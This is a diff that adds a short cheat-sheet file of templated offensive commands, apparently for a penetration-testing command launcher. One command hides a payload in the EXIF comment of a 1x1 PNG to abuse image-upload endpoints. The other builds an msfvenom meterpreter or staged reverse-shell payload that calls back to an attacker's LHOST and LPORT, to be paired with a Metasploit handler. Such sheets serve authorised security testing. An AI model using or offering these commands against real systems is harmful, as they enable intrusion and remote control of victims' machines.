@@ -1,0 +1,36 @@
+# Payload_gen
+
+## payload generation (image)
+
+### Malicious image
+
+Make a 1x1 PNG and stuff a payload into the EXIF Comment. Use against image-upload endpoints that don't strip metadata.
+
+```sh title:"1x1 PNG with payload in EXIF Comment for upload abuse"
+convert -size 1x1 xc:black empty.png && exiftool -Comment='$payloads' empty.png
+```
+<!-- cheat
+import payloads
+import tun_ip
+import webserver
+-->
+
+## payload generation (msfvenom)
+
+### msfvenom payload
+
+Build a msfvenom payload (meterpreter / staged shell) for the chosen format. Pair with a Metasploit handler.
+
+```sh title:"Build msfvenom payload, pair with multi/handler"
+msfvenom -p $payloads LHOST=$lhost LPORT=$lport -o $name -f $format
+```
+<!-- cheat
+import msfvenom
+import sliver
+import tun_ip
+var payloads
+var port
+var name
+var format
+-->
+
